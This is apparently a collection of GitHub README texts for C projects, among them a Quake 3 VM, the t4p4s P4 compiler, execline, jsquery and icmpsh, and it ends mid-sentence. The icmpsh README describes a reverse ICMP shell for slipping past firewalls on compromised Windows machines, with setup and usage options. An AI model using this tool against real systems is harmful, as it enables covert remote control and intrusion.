tuned virtual assembly assembly language for critical functions.*\n*I think this is The Right Thing.*\n\nStatic code analysis\n--------------------\n\nCall `make analysis` and `make valgrind` to check the VM with:\n\n * clang static code analysis (scan-build)\n * cppcheck\n * Valgrind\n\nclang-format\n------------\n\nRun the following command to reformat a file according to the coding style:\n\n    > clang-format -i -style=file input.c\n\n\nDebugging\n---------\n\nBuild `vm.c` with `#define DEBUG_VM` in `vm.h` to enable more checks and debug\nfunctions. Call `VM_Debug()` to enable debug printfs.  This\nrequires the symbol file of the `.qvm`: the `.map` file in the same directory\nas the `.qvm`. The `.map` file is automatically generated for each `.qvm`.\n\nCall at the end of a session `VM_VmProfile_f(vm)` to see a VM usage summary.\n\nBenchmarks\n----------\n\nTime to run `test\/test.qvm`.\n\nSmaller numbers are better (multiple runs, smallest number used).\n\n\n| Interpreter          | Time     |\n|----------------------|----------|\n| Default Interpreter  |  3.063 s |\n| w. computed gotos    |  1.771 s |\n| Native executable    |  0.307 s |\n\n\nEnvironment:\n\n * Ubuntu 17.10\n * GCC: 7.2.0-8ubuntu3.2\n * CPU: Intel(R) Core(TM) i5-3320M CPU @ 2.60GHz\n * Version Git hash: 8e46048f475a53f99f9e6656e030835b6011f2ca\n * Date: 2018.08.31\n\nCommand line:\n\n    time .\/q3vm test\/test.qvm\n    time .\/test\/test_native\n\nBenchmark vs. Triseism Q3 interpreter (seismiq executable).\n\nTestfirmware: `test\/example_test.qvm`\n\nSmaller numbers are better (multiple runs, smallest number used).\n\n\n| Interpreter          | Time     |\n|----------------------|----------|\n| Q3VM                 |  1.222 s |\n| Triseism project     | 10.903 s |\n\n * Ubuntu 17.10\n * GCC: 7.2.0-8ubuntu3.2\n * CPU: Intel(R) Core(TM) i5-3320M CPU @ 2.60GHz\n * Version Git hash: bb4848c25b2b95c08b9aa03bb6ac46ef4948d900\n\nVersion History\n---------------\n\n * v1.3 - q3asm from ioquake3 added\n\n * v1.2 - Debug features enabled (compile with `-DDEBUG_VM`)\n\n * v1.1 - LCC from ioquake3 added\n\nTODO\n----\n\nKnown limitations, bugs, missing features:\n\n * The Quake III Arena JIT compiler (e.g. for x86) is not added.\n\nLICENSE\n-------\n\nSee COPYING.txt for details on the license. Basically the Quake III Arena\nGPL 2 source code license has been inherited.\n\nBe aware that LCC has its own non-commercial license which is described in\nlcc\/COPYRIGHT.\n\nFurther information\n-------------------\n\n * http:\/\/fabiensanglard.net\/quake3\/qvm.php\n * http:\/\/users.suse.com\/~lnussel\/talks\/fosdem_talk_2013_q3.pdf\n\nCredits\n=======\n\nThis project is based on the Quake 3 and ioquake3 source:\n\n * https:\/\/github.com\/id-Software\/Quake-III-Arena (id Software)\n * https:\/\/github.com\/ioquake\/ioq3\n * https:\/\/icculus.org\/projects\/triseism\/triseism.html\n\nComputed gotos are used:\n\n * https:\/\/eli.thegreenplace.net\/2012\/07\/12\/computed-goto-for-efficient-dispatch-tables\n \n"},{"repo":"\/P4ELTE\/t4p4s","language":"C","readme_contents":"\n# T<sub>4<\/sub>P<sub>4<\/sub>S, a multitarget P4<sub>16<\/sub> compiler\n\nThis is an experimental compiler for P4<sub>16<\/sub> and P4<sub>14<\/sub> files.\nFor publications and more, [see our homepage](http:\/\/p4.elte.hu\/).\n\nAn older version of the compiler is [also available](https:\/\/github.com\/P4ELTE\/t4p4s\/tree\/t4p4s-14).\n\nFind out more [about the P4 language](https:\/\/p4.org\/).\n\n## Getting started\n\n### Preparation\n\nTo start working with the compiler, simply download the `bootstrap-t4p4s.sh` script and execute it with the following command. It should work on Debian based systems, e.g. the latest LTS edition of Linux Mint or Ubuntu.\n\n    . .\/bootstrap-t4p4s.sh\n\nThe script installs all necessary software including T<sub>4<\/sub>P<sub>4<\/sub>S itself, and sets up environment variables.\n\n- Note: without the `.` at the beginning of the line, the environment variables will not be usable immediately.\n    - In that case, you can either start a new terminal, or run `. .\/t4p4s_environment_variables.sh`\n\nOverriding defaults.\n\n- To increase efficiency, the script runs jobs on all cores on the system in parallel. Should you experience any problems (for example, your system may run out of memory), you can override the number of jobs.\n\n    MAX_MAKE_JOBS=4 . .\/bootstrap-t4p4s.sh\n\n- By default, the script runs downloads in parallel. You can force it to work sequentially.\n\n    PARALLEL_INSTALL=0 . .\/bootstrap-t4p4s.sh\n\n- The script installs the newest versions of DPDK and P4C unless overridden by the user.\n    \n    DPDK_VERSION=16.11 . .\/bootstrap-t4p4s.sh\n    DPDK_VERSION=16.11 DPDK_FILEVSN=16.11.1 . .\/bootstrap-t4p4s.sh\n\n- The script will use `clang` by default if it is installed. Using another target like `gcc` is possible, too.\n\n    RTE_TARGET=x86_64-native-linuxapp-gcc . .\/bootstrap-t4p4s.sh\n\nTo download T<sub>4<\/sub>P<sub>4<\/sub>S only, make sure to get it with its submodule like this: `git clone --recursive https:\/\/github.com\/P4ELTE\/t4p4s`\n\n- When you pull further commits, you will need to update the submodules as well: `git submodule update --init --recursive` or `git submodule update --rebase --remote`\n\nNote: at this stage, not all P4 programs will compile and run properly. In particular, `typedef`s are not supported currently.\n\n\n### Options\n\nIn the `t4p4s.sh` script, options control the process of compilation and execution.\nThe options are collected in the following phases.\n\n1. By default, the `colours.cfg`, `lights.cfg`, the command line, `examples.cfg` and `opts_${ARCH}.cfg` are processed.\n    - `colours.cfg` describes the available colours for output highlighting.\n    - `lights.cfg` describes which colours are used in the terminal and in the switch output for highlighting.\n    - `examples.cfg` sets options for each example.\n    - `opts_${ARCH}.cfg` sets architecture specific options.\n    - Currently, the only valid value for `${ARCH}` is `dpdk`.\n1. When the command line of the script is processed, anything not identifiable as a P4 program is considered an option.\n    - A P4 program is the name of an existing file whose extension begins with `p4`.\n    - Here, the options are separated by spaces, therefore their values are not allowed to contain spaces themselves.\n1. Option files come in two flavours.\n    - Some files (e.g. `lights.cfg`) contain an option definition on a single line.\n    - Some files (e.g. `examples.cfg`) contain an example identifier and then any number of options on a line.\n        - An example identifier is `examplename@testcasename`, or if `@testcasename` is not given, `@std` is used by default.\n        - As in the case of the command line, options may not contain any spaces.\n    - In both cases, empty lines (containing whitespace only) and comments (a `;` not preceded by a number, until the end of the line) are ignored.\n\nThe format of option definitions is the following.\n\n- Option names contain letters, numbers, `-` (dash), `_` (underscore) and `.` (dot).\n- Define `myopt` with the value `myval`.\n    `myopt=myval`\n- Define `myopt` that takes the default value `on`.\n    `myopt`\n- In the cases described above, spaces can be allowed.\n    `myopt=foo bar`\n- From this point on, `myopt` is ignored: it is considered not to be defined.\n    `^myopt`\n- Define `myopt` with the value `val` only if `mycondopt` _is defined_ at this time.\n    `mycondopt->myopt=val`\n- Define `myopt` with the value `val` only if `mycondopt` is _not_ defined at this time.\n    `^mycondopt->myopt=val`\n- Define `myopt` with the value `val` only if `mycondopt` is defined at this time, and its value is `condval`.\n    `mycondopt=condval->myopt=val`\n- In all of the above, `+=` `++=` can take the place of `=`. Instead of setting the option, they append to the current value: `+=` with a space separator, `++=` with a newline.\n  - `myopt=foo` and then `myopt+=bar` is equivalent to `myopt=foo bar`\n- For convenience, there are some abbreviations.\n\n    | Option given            | Equivalent to                                                           |\n    | ----------------------- | ----------------------------------------------------------------------- |\n    | @myvariant              | variant=**myvariant**                                                   |\n    | :myexample              | example=**myexample**                                                   |\n    | ::myexample             | example=**myexample** dbg                                               |\n    | %myexample=mytestcase   | example=**myexample** variant=test testcase=**mytestcase**              |\n    | %myexample              | example=**myexample** variant=test testcase=test                        |\n    | %%myexample=mytestcase  | example=**myexample** variant=test verbose dbg testcase=**mytestcase**  |\n    | %%myexample             | example=**myexample** variant=test verbose dbg suite                    |\n\n\n### Execution\n\nThe `t4p4s.sh` script uses settings from three configuration files.\n\n1. `light.cfg` describes how texts in the terminal and switch output look.\n1. `examples.cfg` describes default options for the examples.\n    - A set of parameters for an example is called a configuration _variant_.\n    - On the command line, you have to specify the _example_ (by name or full path) and the _variant name_.\n1. An architecture specific file (for DPDK, `opts_dpdk.cfg`) describes how the options are to be interpreted: they are translated to more options.\n    - Everything apart from the _example_ is considered an option on the command line.\n\nThe script returns an exit code of `0` if the execution was successful, and a non-zero value otherwise.\n\nThe script creates `build\/<example-name>`.\n\n- Under it, the directories `build`, `srcgen` and `Makefile` contain compilation artifacts, including the created switch executable.\n- Log output is stored in `log`.\n    - `controller.log` is the log output from the most recent controller execution.\n    - For each execution, two log files are created.\n        - The one with the simple `.txt` extension is a regular textual log.\n        - The one with the `lit.txt` extension contains ANSI colour codes. Invoking `cat` on it, or using an appropriate viewer like [SublimeANSI](https:\/\/github.com\/aziz\/SublimeANSI) will show coloured output.\n        - The logs of the most recent script execution are also available as `last.txt` and `last.lit.txt`.\n\n\n### Examples\n\nNote that for non-testing examples, you will have to setup your network card, and probably adjust your configuration options.\n\n1. Specify an example\n    - Run an example with the default configuration\n        `.\/t4p4s.sh :l2fwd`\n    - The program finds the source file under `examples` automatically, but you can also specify it manually\n        `.\/t4p4s.sh .\/examples\/l2fwd.p4_14`\n1. Execution phases, option settings\n    - Specify one or more steps to be taken\n        `.\/t4p4s.sh :l2fwd p4`\n        `.\/t4p4s.sh :l2fwd c`\n        `.\/t4p4s.sh :l2fwd run`\n    - If no option is given, all phases (`p4 c run`) are active\n        `.\/t4p4s.sh :l2fwd`\n    - Options can be given in any order (phases will always run in `p4 c run` order)\n        `.\/t4p4s.sh :l2fwd p4 c`\n        `.\/t4p4s.sh :l2fwd c p4`\n    - All options have one parameter, which defaults to \"on\"\n        `.\/t4p4s.sh :l2fwd p4=on c=on run=on`\n    - Prefixing an option with `^` suppresses it\n        - Run only P4-to-C and C-to-switch compilation\n        `.\/t4p4s.sh :l2fwd ^run`\n    - Set the controller configuration (the controller program takes it as a parameter)\n        `.\/t4p4s.sh :l2fwd ctrcfg=my_ctr_opts.txt`\n1. Output options: highlighting, verbosity\n    - Get monochrome (black-and-white) output, useful for scripting\n        `.\/t4p4s.sh :l2fwd bw`\n    - Monochrome terminal, colour switch execution\n        `.\/t4p4s.sh :l2fwd bw=terminal`\n    - Colour terminal, monochrome switch execution\n        `.\/t4p4s.sh :l2fwd bw=switch`\n    - Verbose output for the terminal\n        `.\/t4p4s.sh :l2fwd verbose`\n    - Verbose output for the switch\n        `.\/t4p4s.sh :l2fwd dbg`\n    - Suppress EAL messages from the switch output\n        `.\/t4p4s.sh :l2fwd noeal`\n    - No output at all (both terminal and switch) except for errors\n        `.\/t4p4s.sh :l2fwd silent`\n    - If the switch fails, runs it again in the debugger (by default, `gdb`)\n        `.\/t4p4s.sh :l2fwd autodbg`\n1. Variants, testing\n    - Specify a variant, a set of configuration options\n        `.\/t4p4s.sh :l2fwd @test`\n        `.\/t4p4s.sh :l2fwd variant=test`\n    - Run a single test case\n        - It runs offline: no network card is needed\n        - Data for the test case is in `examples\/test-l2fwd.c`\n        `.\/t4p4s.sh :l2fwd @test testcase=test`\n        `.\/t4p4s.sh :l2fwd @test testcase=payload`\n    - Abbreviated form (also sets `@test`)\n        `.\/t4p4s.sh %l2fwd=payload`\n    - Another abbreviation, equivalent to using `testcase`, `dbg` and `@test`\n        `.\/t4p4s.sh ::l2fwd`\n    - Run the test suite for the example\n        `.\/t4p4s.sh %%l2fwd`\n    - Stop the switch immediately upon encountering invalid data\n        `.\/t4p4s.sh %l2fwd=payload strict`\n1. Miscellaneous options\n    - Specify the P4 version manually (usually decided by other options or P4 file extension)\n        `.\/t4p4s.sh :l2fwd vsn=14`\n    - Set the controller manually\n        `.\/t4p4s.sh :l2fwd ctr=l2fwd`\n    - Many options can be overridden using environment variables\n        `EXAMPLES_CONFIG_FILE=\"my_config.cfg\" .\/t4p4s.sh my_p4 @test`\n        `EXAMPLES_CONFIG_FILE=\"my_config.cfg\" COLOUR_CONFIG_FILE=\"my_colors.txt\" P4_SRC_DIR=\"..\/my_files\" ARCH_OPTS_FILE=\"my_opts.cfg\" .\/t4p4s.sh %my_p4 dbg verbose`\n\n\n### Testing\n\nAs described above, you can run individual test cases.\nTo see detailed output about compilation and execution, use the following options.\n\n    .\/t4p4s.sh %%l2fwd=payload\n\nTo run all available test cases, execute `.\/run_all_tests.sh`.\nYou can also give this script any number of additional options.\n\n    .\/run_all_tests.sh verbose dbg\n\nOnce all test cases are run, the script prints a summary of successful and failed test cases,\nexits with the error code `0` if all tests ran successfully, and `1` if there were any errors.\n\n\n# Using Docker with T<sub>4<\/sub>P<sub>4<\/sub>S\n\nYou can also run `t4p4s-docker.sh` to run T<sub>4<\/sub>P<sub>4<\/sub>S in a Docker container.\n\n- Docker Community Edition has to be configured on your system.\n    - Usually it is available once you install the package `docker.io`.\n    - For more details, see [this guide](https:\/\/docs.docker.com\/engine\/installation\/linux\/docker-ce\/ubuntu\/).\n- Running `t4p4s-docker.sh` sets up two containers called `t4p4s` and `t4p4s-sh`.\n    - Both are usable separately.\n    - The `t4p4s-sh` container also takes all arguments for `t4p4s-docker.sh`.\n        - For example, you can run `.\/t4p4s-docker.sh verbose dbg %l2fwd=payload`\n        - Currently, the containers are run without a network card configuration.\n- The Docker instances rely on having the same version for `linux-headers` as the host system. See the `FROM` clause in the `t4p4s-16.docker` file.\n- The configuration is based on that of [`docker-dpdk` by Jeremy Eder](https:\/\/github.com\/jeremyeder\/docker-dpdk\/), which includes using the host's `hugepages` inside the Docker instances.\n    - Make sure you have enough `hugepages` on the host before running the containers.\n\n\n# Working with the compiler\n\n## Gathering data\n\nThe following parts presume that you are using `ipdb` for debugging.\nYou can manually add a debug trigger the following way.\n\n~~~\nimport ipdb; ipdb.set_trace()\n~~~\n\nA convenient place to start an investigation is at the end of `set_additional_attrs` in `hlir16_attrs.py`.\n\nYou can search for all occurrences of a string\/integer\/etc.\nTypically you would start at the topmost node (called `hlir16`),\nbut any node can be used as a starting point.\n\n~~~\nhl[TAB]\nhlir16.p[TAB]\nhlir16.paths_to('ethernet')\nhlir16.paths_to(1234567)\n~~~\n\nThe result will look something like this.\n\n~~~\n  = .objects['Type_Header'][0]\n  < .objects['Type_Struct'][4].fields\n  \u2208 .objects['P4Parser'][0].states['ParserState'][0].components['MethodCallStatement'][0].methodCall.arguments['Member'][0].expr.type.fields\n  < .objects['P4Parser'][0].states['ParserState'][0].components['MethodCallStatement'][0].methodCall.arguments['Member'][0].member\n  < .objects['P4Parser'][0].states['ParserState'][0].components['MethodCallStatement'][0].methodCall.arguments['Member'][0].type\n  < .objects['P4Parser'][0].states['ParserState'][0].components['MethodCallStatement'][0].methodCall.typeArguments['Type_Name'][0].path\n  < .objects['P4Parser'][0].states['ParserState'][0].selectExpression.select.components['Member'][0].expr.expr.type.fields\n  < .objects['P4Parser'][0].states['ParserState'][0].selectExpression.select.components['Member'][0].expr.member\n...........\n~~~\n\nThe first character indicates if the searched content is a perfect match (`=`), a prefix (`<`) or an infix (`\u2208`) of the result of the path.\n\nYou can copy-paste a line of the result, and inspect the element there.\n\n~~~\nipdb> hlir16.objects['P4Parser'][0].states['ParserState'][0].components['MethodCallStatement'][0].methodCall.arguments['Member'][0].type\nethernet_t<Type_Header>[annotations, declid, fields, name]\n~~~\n\nYou can give some options to `paths_to`.\n\n- `print_details` shows each node that each path traverses\n- `match` controls how the matching works (it is always textual)\n\n~~~\nhlir16.paths_to('intrinsic_metadata')\nhlir16.paths_to('intrinsic_metadata', print_details=False, match='prefix')\nhlir16.paths_to('intrinsic_metadata', match='prefix')\nhlir16.paths_to('intrinsic_metadata', match='infix')\nhlir16.paths_to('intrinsic_metadata', match='full')\n~~~\n\n\n## Attributes\n\nThe nodes get their attributes in the following ways.\n\n1. At creation, see `p4node.py`.\n    - In the debugger, enter `hlir16.common_attrs` to see them.\n1. Most attributes are directly loaded from the JSON file.\n    - See `load_p4` in `hlir16.py`.\n    - The `.json` file is produced using the `--toJSON` option of the P4 frontend `p4test`.\n      By default, this is a temporary file that is deleted upon exit.\n1. Many attributes are set in `set_additional_attrs` in `hlir16.py`.\n   While the compiler is in the experimental stage,\n   they may be subject to change, but once it crystallizes,\n   they will be considered standard.\n1. You can manually add attributes using `add_attrs`, but those will be considered non-standard,\n   and will not be portable in general.\n\nThe representation contains internal nodes (of type `P4Node`)\nand leaves (primitives like ints and strings).\nInternal nodes will sometimes be (ordered) vectors.\n\nSome of the more important attributes are the following.\n\n~~~\nhl[TAB].d[TAB]        # expands to...\nhlir16.objects   # these are the top-level objects in the program\n\nds = hlir16.objects\nds.is_vec()           # True\nds[0]                 # indexes the vector; the first declaration in the program\nds.b[TAB]             # expands to...\nds.by_type('Type_Struct')   # gives you all 'Type_Struct' objects\nds.by_type('Struct')        # shortcut; many things are called 'Type_...'\nds.get('name')        # all elems in the vector with the name 'name'\nds.get('ipv4_t', 'Type_Header')   # the same, limited to the given type\n\nany_node.name         # most nodes (but not all) have names\nany_node.xdir()       # names of the node's non-common attributes\n~~~\n\n## Special markers\n\nThe compiler uses the `.py` files inside the `hardware_indep` directory to generate Python code (saved with the extension `.desugared.py` under `build\/util\/desugared_compiler`), then executes the code to produce `.c` files. Under `src\/utils`, files with the extension `.sugar.py` are also primarily used as code generators. The files are written with some syntactical sugar, which is described in the following.\n\n- The files under `hardware_indep` have access to the global variable `hlir16`, which is the root of the representation.\n    - The compiler silently prepares a `generated_code` global variable that starts out with an empty text. Usually, you do not want to manipulate it directly.\n    - The files may contain the following markers. `PyExpr` stands for a Python expression.\n        - `#[ (insert generated code here)`: the code will be textually added to `generated_code`\n        - `#[ ... $my_var ...`: the textual value of the Python variable `my_var` is inserted here\n        - `#[ ... ${PyExpr} ...`: the code is evaluated, then its result will be inserted as text\n        - `#= PyExpr`: the expression is evaluated, its result is inserted textually\n            - an alternative to this is to use `#[ ${Python expression}`\n        - `#{` and `#}`: the same as `#[`, except that code between the two will be indented one level\n            - the compiler expects that all opened `#{` markers will have a proper corresponding `#}` marker\n        - `$${PyExpr}` highlights the evaluated text using the default colour (`T4LIGHT_default`)\n            - `$$[mycolourname]{PyExpr}` uses `T4LIGHT_mycolourname` as the colour of highlighting; these colours are defined in `lights.cfg` and must be listed in `ALL_COLOURS` of `t4p4s.sh`\n            - `$$[mycolourname]{PyExpr}{text}` is the same as above, but `text` (which is just plain text) also appears in the highlighted part\n            - `$$[mycolourname][text1]{PyExpr}{text}` is the same as above, but `text1` (which is just plain text) also appears in the highlighted part\n- The following capabilities are most useful inside the `.sugar.py` files, but are used in `hardware_indep` as well.\n    - Functions whose name begin with `gen_` are considered helper functions in which the above markers are usable.\n        - Technically, they will have a local `generated_code` variable that starts out empty, and they will return it at the end.\n        - In general, such functions will contain a single conditional with multiple clauses, with each clause generating a bit of code.\n        - Usually, it's a good idea to have a function with the same name (without the `gen_` part) that calls the function.\n    - To facilitate finding the corresponding generator file, the desugared (generated) files contain line hints about the original file.\n        - For types and expressions, these can be made inline, e.g. `uint8_t \/* codegen@123*\/` means that the text `uint8_t` was generated by executing code on or around line 123 in `codegen.sugar.py` (in the directory `src\/utils`).\n        - Most of the code generate statements, they contain hints at the end of the line such as `... \/\/ actions@123`\n        - You can control the sugar style using `file_sugar_style` and the class `SugarStyle` (in `compiler.py`), see the end of `codegen.sugar.py` for usage examples.\n"},{"repo":"\/skarnet\/execline","language":"C","readme_contents":"execline - an interpreter-less scripting language\n-------------------------------------------------\n\n execline is a scripting language unlike any other in that\nit has no resident interpreter. It reads a script, turns it\ninto a single command line, and executes into that command\nline; control is performed by executables run inside the\ncommand line itself.\n\n It is especially suited to very small and simple scripts\nfor which a shell is overpowered.\n\n See https:\/\/skarnet.org\/software\/execline\/ for details.\n\n\n* Installation\n  ------------\n\n See the INSTALL file.\n\n\n* Contact information\n  -------------------\n\n Laurent Bercot <ska-skaware at skarnet.org>\n\n Please use the <skaware at list.skarnet.org> mailing-list for\nquestions about execline.\n\n"},{"repo":"\/inquisb\/icmpsh","language":"C","readme_contents":"## Background\r\n\r\nSometimes, network administrators make the penetration tester's life harder. Some of them do use firewalls for what they are meant to, surprisingly!\r\nAllowing traffic only onto known machines, ports and services (ingress filtering) and setting strong egress access control lists is one of these cases. In such scenarios when you have owned a machine part of the internal network or the DMZ (e.g. in a Citrix breakout engagement or similar), it is not always trivial to get a reverse shell over TCP, not to consider a bind shell.\r\n\r\nHowever, what about UDP (commonly a DNS tunnel) or ICMP as the channel to get a reverse shell? ICMP is the focus on this tool.\r\n\r\n## Description\r\n\r\nicmpsh is a simple reverse ICMP shell with a win32 slave and a POSIX compatible master in C, Perl or Python. The main advantage over the other similar open source tools is that it does not require administrative privileges to run onto the target machine.\r\n\r\nThe tool is clean, easy and portable. The **slave (client) runs on the target Windows machine**, it is written in C and works on Windows only whereas the **master (server) can run on any platform on the attacker machine** as it has been implemented in C and Perl by [Nico Leidecker](http:\/\/www.leidecker.info\/) and I have ported it to Python too, hence this GitHub fork.\r\n\r\n## Features\r\n\r\n* Open source software - primarily coded by Nico, forked by me.\r\n* Client\/server architecture.\r\n* The master is portable across any platform that can run either C, Perl or Python code.\r\n* The target system has to be Windows because the slave runs on that platform only for now.\r\n* The user running the slave on the target system does not require administrative privileges.\r\n\r\n## Usage\r\n\r\n### Running the master\r\n\r\nThe master is straight forward to use. There are no extra libraries required for the C and Python versions. The Perl master however has the following dependencies:\r\n\r\n* IO::Socket\r\n* NetPacket::IP\r\n* NetPacket::ICMP\r\n\r\nWhen running the master, don't forget to disable ICMP replies by the OS. For example:\r\n```\r\nsysctl -w net.ipv4.icmp_echo_ignore_all=1\r\n```\r\n\r\nIf you miss doing that, you will receive information from the slave, but the slave is unlikely to receive commands send from the master.\r\n\r\n### Running the slave\r\n\r\nThe slave comes with a few command line options as outlined below:\r\n\r\n```\r\n-t host            host ip address to send ping requests to. This option is mandatory!\r\n\r\n-r                 send a single test icmp request containing the string \"Test1234\" and then quit. \r\n                   This is for testing the connection.\r\n\r\n-d milliseconds    delay between requests in milliseconds \r\n\r\n-o milliseconds    timeout of responses in milliseconds. If a response has not received in time, \r\n                   the slave will increase a counter of blanks. If that counter reaches a limit, the slave will quit.\r\n                   The counter is set back to 0 if a response was received.\r\n\r\n-b num             limit of blanks (unanswered icmp requests before quitting\r\n\r\n-s bytes           maximal data buffer size in bytes\r\n```\r\n\r\nIn order to improve the speed, lower the delay (*-d*) between requests or increase the size (-s) of the data buffer.\r\n\r\n## License\r\n\r\nThis source code is free software; you can redistribute it and\/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version.\r\n\r\nThis library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details.\r\n\r\nYou should have received a copy of the GNU Lesser General Public License along with this library; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA\r\n"},{"repo":"\/postgrespro\/jsquery","language":"C","readme_contents":"[![Build Status](https:\/\/travis-ci.org\/postgrespro\/jsquery.svg?branch=master)](https:\/\/travis-ci.org\/postgrespro\/jsquery)\n[![codecov](https:\/\/codecov.io\/gh\/postgrespro\/jsquery\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/postgrespro\/jsquery)\n[![GitHub license](https:\/\/img.shields.io\/badge\/license-PostgreSQL-blue.svg)](https:\/\/raw.githubusercontent.com\/postgrespro\/jsquery\/master\/LICENSE)\n\nJsQuery \u2013 json query language with GIN indexing support\n=======================================================\n\nIntroduction\n------------\n\nJsQuery \u2013 is a language to query jsonb data type, introduced in PostgreSQL\nrelease 9.4.\n\nIt's primary goal is to provide an additional functionality to jsonb\n(currently missing in PostgreSQL), such as a simple and effective way\nto search in nested objects and arrays, more comparison operators with\nindexes support. We hope, that jsquery will be eventually a part of\nPostgreSQL.\n\nJsquery is released as jsquery data type (similar to tsquery) and @@\nmatch operator for jsonb.\n\nAuthors\n-------\n\n * Teodor Sigaev <teodor@sigaev.ru>, Postgres Professional, Moscow, Russia\n * Alexander Korotkov <aekorotkov@gmail.com>, Postgres Professional, Moscow, Russia\n * Oleg Bartunov <oleg@sai.msu.su>, Postgres Professional, Moscow, Russia\n\nAvailability\n------------\n\nJsQuery is realized as an extension and not available in default PostgreSQL\ninstallation. It is available from\n[github](https:\/\/github.com\/postgrespro\/jsquery)\nunder the same license as\n[PostgreSQL](https:\/\/www.postgresql.org\/about\/licence\/)\nand supports PostgreSQL 9.4+.\n\nRegards\n-------\n\nDevelopment was sponsored by [Wargaming.net](http:\/\/wargaming.net).\n\nInstallation\n------------\n\nJsQuery is PostgreSQL extension which requires PostgreSQL 9.4 or higher.\nBefore build and install you should ensure following:\n    \n * PostgreSQL version is 9.4 or higher.\n * You have development package of PostgreSQL installed or you built\n   PostgreSQL from source.\n * You have flex and bison installed on your system. JsQuery was tested on\n   flex 2.5.37-2.5.39, bison 2.7.12.\n * Your PATH variable is configured so that pg\\_config command available, or set PG_CONFIG variable.\n    \nTypical installation procedure may look like this:\n    \n    $ git clone https:\/\/github.com\/postgrespro\/jsquery.git\n    $ cd jsquery\n    $ make USE_PGXS=1\n    $ sudo make USE_PGXS=1 install\n    $ make USE_PGXS=1 installcheck\n    $ psql DB -c \"CREATE EXTENSION jsquery;\"\n\nJSON query language\n-------------------\n\nJsQuery extension contains `jsquery` datatype which represents whole JSON query\nas a single value (like `tsquery` does for fulltext search). The query is an\nexpression on JSON-document values.\n\nSimple expression is specified as `path binary_operator value` or\n`path unary_operator`. See following examples.\n\n * `x = \"abc\"` \u2013 value of key \"x\" is equal to \"abc\";\n * `$ @> [4, 5, \"zzz\"]` \u2013 the JSON document is an array containing values\n    4, 5 and \"zzz\";\n * `\"abc xyz\" >= 10` \u2013 value of key \"abc xyz\" is greater than or equal to 10;\n * `volume IS NUMERIC` \u2013 type of key \"volume\" is numeric.\n * `$ = true` \u2013 the whole JSON document is just a true.\n * `similar_ids.@# > 5` \u2013 similar\\_ids is an array or object of length greater\n   than 5;\n * `similar_product_ids.# = \"0684824396\"` \u2013 array \"similar\\_product\\_ids\"\n   contains string \"0684824396\".\n * `*.color = \"red\"` \u2013 there is object somewhere which key \"color\" has value\n   \"red\".\n * `foo = *` \u2013 key \"foo\" exists in object.\n\nPath selects set of JSON values to be checked using given operators. In\nthe simplest case path is just an key name. In general path is key names and\nplaceholders combined by dot signs. Path can use following placeholders:\n\n * `#` \u2013 any index of array;\n * `#N` \u2013 N-th index of array;\n * `%` \u2013 any key of object;\n * `*` \u2013 any sequence of array indexes and object keys;\n * `@#` \u2013 length of array or object, could be only used as last component of\n    path;\n * `$` \u2013 the whole JSON document as single value, could be only the whole path.\n\nExpression is true when operator is true against at least one value selected\nby path.\n\nKey names could be given either with or without double quotes. Key names\nwithout double quotes shouldn't contain spaces, start with number or concur\nwith jsquery keyword.\n\nThe supported binary operators are:\n\n * Equality operator: `=`;\n * Numeric comparison operators: `>`, `>=`, `<`, `<=`;\n * Search in the list of scalar values using `IN` operator;\n * Array comparison operators: `&&` (overlap), `@>` (contains),\n   `<@` (contained in).\n\nThe supported unary operators are:\n\n * Check for existence operator: `= *`;\n * Check for type operators: `IS ARRAY`, `IS NUMERIC`, `IS OBJECT`, `IS STRING`\n   and `IS BOOLEAN`.\n\nExpressions could be complex. Complex expression is a set of expressions\ncombined by logical operators (`AND`, `OR`, `NOT`) and grouped using braces.\n\nExamples of complex expressions are given below.\n\n * `a = 1 AND (b = 2 OR c = 3) AND NOT d = 1`\n * `x.% = true OR x.# = true`\n\nPrefix expressions are expressions given in the form path (subexpression).\nIn this case path selects JSON values to be checked using given subexpression.\nCheck results are aggregated in the same way as in simple expressions.\n\n * `#(a = 1 AND b = 2)` \u2013 exists element of array which a key is 1 and b key is 2\n * `%($ >= 10 AND $ <= 20)` \u2013 exists object key which values is between 10 and 20\n\nPath also could contain following special placeholders with \"every\" semantics:\n\n * `#:` \u2013 every indexes of array;\n * `%:` \u2013 every key of object;\n * `*:` \u2013 every sequence of array indexes and object keys.\n\nConsider following example.\n\n    %.#:($ >= 0 AND $ <= 1)\n\nThis example could be read as following: there is at least one key which value\nis array of numerics between 0 and 1.\n\nWe can rewrite this example in the following form with extra braces.\n\n    %(#:($ >= 0 AND $ <= 1))\n\nThe first placeholder `%` checks that expression in braces is true for at least\none value in object. The second placeholder `#:` checks value to be array and\nall its elements satisfy expressions in braces.\n\nWe can rewrite this example without `#:` placeholder as follows.\n\n    %(NOT #(NOT ($ >= 0 AND $ <= 1)) AND $ IS ARRAY)\n\nIn this example we transform assertion that every element of array satisfy some\ncondition to assertion that there is no one element which doesn't satisfy the\nsame condition.\n\nSome examples of using paths are given below.\n\n * `numbers.#: IS NUMERIC` \u2013 every element of \"numbers\" array is numeric.\n * `*:($ IS OBJECT OR $ IS BOOLEAN)` \u2013 JSON is a structure of nested objects\n   with booleans as leaf values.\n * `#:.%:($ >= 0 AND $ <= 1)` \u2013 each element of array is object containing\n   only numeric values between 0 and 1.\n * `documents.#:.% = *` \u2013 \"documents\" is array of objects containing at least\n   one key.\n * `%.#: ($ IS STRING)` \u2013 JSON object contains at least one array of strings.\n * `#.% = true` \u2013 at least one array element is objects which contains at least\n   one \"true\" value.\n\nUsage of path operators and braces need some explanation. When same path\noperators are used multiple times they may refer different values while you can\nrefer same value multiple time by using braces and `$` operator. See following\nexamples.\n\n * `# < 10 AND # > 20` \u2013 exists element less than 10 and exists another element\n   greater than 20.\n * `#($ < 10 AND $ > 20)` \u2013 exists element which both less than 10 and greater\n   than 20 (impossible).\n * `#($ >= 10 AND $ <= 20)` \u2013 exists element between 10 and 20.\n * `# >= 10 AND # <= 20` \u2013 exists element great or equal to 10 and exists\n   another element less or equal to 20. Query can be satisfied by array with\n   no elements between 10 and 20, for instance [0,30].\n\nSame rules apply when you search inside objects and branchy structures.\n\nType checking operators and \"every\" 